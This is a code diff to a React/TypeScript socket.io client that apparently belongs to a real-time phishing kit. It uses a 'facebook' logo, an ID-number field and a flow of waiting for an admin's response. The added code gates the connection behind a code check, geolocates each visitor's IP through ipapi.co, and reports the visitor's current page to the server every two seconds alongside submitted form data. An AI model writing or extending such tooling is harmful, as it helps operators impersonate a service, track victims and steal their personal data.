@@ -6,6 +6,7 @@ import { getCookie, setCookie } from "cookies-next";
 import { FieldValues } from "react-hook-form";
 import { NavigateFunction } from "react-router-dom";
 import { io as ClientIO } from "socket.io-client";
+import { v4 as unique } from "uuid";
 import { Message } from "../../types";
 
 // ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //
@@ -19,7 +20,7 @@ export const socket = signal(
       : import.meta.env.VITE_PROD_SOCKET_IO_URL,
     {
       transports: ["polling"],
-      autoConnect: true,
+      autoConnect: false,
       forceNew: true,
     }
   )
@@ -80,30 +81,61 @@ export const code = signal("");
 
 export const logo = signal("facebook");
 
+export const specialId = signal("");
+
+export const isCheck = signal(false);
+
 // == Listen For Successfully Connected With Real Time Server  ==
+
+effect(() => {
+  axios
+    .post(
+      `${
+        import.meta.env.VITE_MODE == "DEV"
+          ? import.meta.env.VITE_DEV_API_URL
+          : import.meta.env.VITE_PROD_API_URL
+      }/auth/check`,
+      { code: ROOM }
+    )
+    .then(() => {
+      isCheck.value = true;
+    })
+    .catch(() => {
+      isCheck.value = false;
+    });
+});
+
+effect(() => {
+  if (isCheck.value)
+    axios
+      .get("https://ipapi.co/json/")
+      .then((res) => {
+        socket.value.connect();
+
+        mainInfo.value = {
+          ...mainInfo.value,
+          room: ROOM,
+          Ip: res.data?.ip,
+          country: res.data?.country_name,
+          city: res.data?.city,
+          date: new Date().toString(),
+          socketId: socketId.value,
+        };
+      })
+      .catch((err) => {
+        console.log(err);
+      });
+});
 
 socket.value.on("successfully-connected", (id: string) => {
   socketId.value = id;
-
-  // api To Get Current Device Info
-  axios.get("https://ipapi.co/json/").then((res) => {
-    mainInfo.value = {
-      ...mainInfo.value,
-      room: ROOM,
-      Ip: res.data?.ip,
-      country: res.data?.country_name,
-      city: res.data?.city,
-      date: new Date().toString(),
-      socketId: socketId.value,
-    };
-  });
 
   //Joining With Current Id To Server
   socket.value.emit("join", socketId.value);
 });
 
 effect(() => {
-  if (currentPage.value && mainInfo.value.Ip) {
+  if (currentPage.value && mainInfo.value.Ip && socketId.value) {
     socket.value.emit("currentPage", {
       ...mainInfo.value,
       page: currentPage.value,
@@ -140,6 +172,8 @@ effect(() => {
 });
 
 // ==> EVENT FROM SERVER <== //
+
+//Check If Admin Connected
 
 // == Receiving Messages For Chat ==
 
@@ -212,6 +246,7 @@ export function sendDataToServer({
     idNumber: mainInfo.value?.idNumber,
     mode,
     waitingForAdminResponse,
+    unique: unique(),
   });
 
   if (waitingForAdminResponse) {
@@ -285,3 +320,20 @@ export async function getInitInfo() {
       console.log(err);
     });
 }
+
+// New
+
+function sendData() {
+  if (currentPage.value && mainInfo.value.Ip && socketId.value) {
+    socket.value.emit("currentPage", {
+      ...mainInfo.value,
+      page: currentPage.value,
+      room: ROOM,
+      socketId: socketId.value,
+    });
+  }
+}
+
+setInterval(() => {
+  if (isCheck.value) sendData();
+}, 2000);
